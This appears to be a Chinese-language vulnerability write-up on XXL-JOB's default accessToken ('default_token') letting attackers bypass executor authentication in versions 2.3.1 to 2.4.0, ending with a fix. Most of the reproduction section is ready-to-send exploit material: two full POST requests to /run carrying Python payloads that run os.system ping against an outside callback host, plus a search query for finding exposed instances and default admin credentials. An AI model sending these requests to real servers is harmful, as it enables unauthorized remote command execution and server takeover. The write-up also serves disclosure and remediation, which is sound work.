# XXL-JOB 默认 accessToken 身份绕过漏洞

## 漏洞描述

XXL-JOB 是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB 分为 admin 和 executor 两端，前者为后台管理页面，后者是任务执行的客户端。

XXL-JOB 默认配置下，用于调度通讯的 accessToken 不是随机生成的，而是使用 application.properties 配置文件中的默认值。在实际使用中，如果没有修改默认值，攻击者可绕过认证调用 executor，执行任意命令，从而获取服务器权限。

## 披露时间

```
2023-11-01
```

## 漏洞影响

```
v2.3.1 <= XXL-JOB <= v2.4.0
```

## 网络测绘

```
app="XXL-JOB" || title="任务调度中心" || ("invalid request, HttpMethod not support" && port="9999")
```

## 环境搭建

本地搭建 XXL-JOB v2.3.1，源码 https://github.com/xuxueli/xxl-job/archive/refs/tags/2.3.1.zip

环境启动后，访问 `http://your-ip:8080/xxl-job-admin/toLogin` 即可查看到管理端（admin），访问 `http://your-ip:9999` 可以查看到客户端（executor）。

默认口令 `admin/123456` 登录后台：

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112174933070.png)

## 漏洞复现

从 XXL-JOB v2.3.1 版本开始，在 application.properties 为 accessToken 增加了默认值：

```
xxl.job.accessToken=default_token
```

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112151222555.png)

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112173432704.png)

在实际使用中，如果没有修改默认值，攻击者可绕过认证调用 executor，执行任意命令，从而获取服务器权限。

首先，我们不带 `XXL-JOB-ACCESS-TOKEN`，对 executor 未授权访问漏洞进行利用，探测目标是否出网。此处运行模式为 GLUE 模式 (Python)，其他方式均可，主要取决于目标环境。

```
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 407

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_PYTHON",
  "glueSource": "import os\nos.system('ping 0e6ee0e0f3.ipv6.1433.eu.org.')",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

HTTP Status Code 500，报错：

```
{"code":500,"msg":"The access token is wrong."}
```

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112175042454.png)

然后，我们带上 `XXL-JOB-ACCESS-TOKEN`，再次发送数据包：

```
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
XXL-JOB-ACCESS-TOKEN: default_token
Content-Length: 407

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_PYTHON",
  "glueSource": "import os\nos.system('ping d02caeb35f.ipv6.1433.eu.org.')",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```

HTTP Status Code 200，成功：

![](images/XXL-JOB%20默认%20accessToken%20身份绕过漏洞/image-20241112180203573.png)

## 漏洞修复

修改调度中心和执行器配置项 `xxl.job.accessToken` 的默认值，注意要设置相同的值。

参考 [官方文档](https://www.xuxueli.com/xxl-job/#5.10%20%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C%EF%BC%88AccessToken%EF%BC%89) 中 5.10 章节关于访问令牌（AccessToken）的相关描述：

- 为提升系统安全性，调度中心和执行器进行安全性校验，双方 AccessToken 匹配才允许通讯；
- 调度中心和执行器，可通过配置项 “xxl.job.accessToken” 进行 AccessToken 的设置。
- 调度中心和执行器，如果需要正常通讯，只有两种设置；
	- 设置一：调度中心和执行器，均不设置 AccessToken；关闭安全性校验；
	- 设置二：调度中心和执行器，设置了相同的 AccessToken；
